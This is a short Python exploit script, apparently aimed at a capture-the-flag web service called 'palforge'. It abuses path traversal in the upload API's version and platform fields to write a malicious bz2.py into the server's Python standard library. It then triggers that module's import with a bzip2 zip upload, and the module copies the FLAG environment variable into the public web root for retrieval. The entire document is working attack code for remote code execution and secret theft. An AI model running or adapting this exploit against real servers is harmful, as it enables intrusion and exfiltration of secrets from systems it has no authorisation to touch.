import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = pf.BASE
u = "u%d"%random.randint(10000,99999); pw="pass12345"
requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
tok = pf.login(u,pw)
def w(tok, ver, code, filename, data):
    pid = pf.create_platform(tok, code, name="z")
    mid = pf.create_mod(tok, ver, title="z")
    bid = pf.create_build(tok, mid, pid)
    return pf.upload_zip(tok, mid, bid, {filename: data})
def trigger(tok, zipcomp):
    bio = io.BytesIO()
    with zipfile.ZipFile(bio,"w",zipcomp) as zf:
        zf.writestr("data.txt", b"x")
    bio.seek(0)
    pid = pf.create_platform(tok, "tr%d"%random.randint(0,9999), name="z")
    mid = pf.create_mod(tok, "v%d"%random.randint(0,9999), title="z")
    bid = pf.create_build(tok, mid, pid)
    return requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/",
        headers={"Authorization":f"Bearer {tok}"}, files={"zip_file":("p.zip",bio,"application/zip")}, timeout=20)

# plant bz2.py in running stdlib
mal = b'import os\nopen("/usr/share/nginx/html/bz2rk.txt","w").write(os.environ.get("FLAG","NOFLAG"))\n'
r = w(tok, "../../../usr/local", "lib/python3.11", "bz2.py", mal)
print("write bz2.py ->", r.status_code)
r2 = trigger(tok, zipfile.ZIP_BZIP2)
print("bzip2 trigger ->", r2.status_code, r2.text[:60])
time.sleep(2)
try:
    c = requests.get(f"{BASE}/bz2rk.txt", timeout=8)
    print("bz2rk status:", c.status_code, "body:", repr(c.content[:150]))
except Exception as e:
    print("err", e)
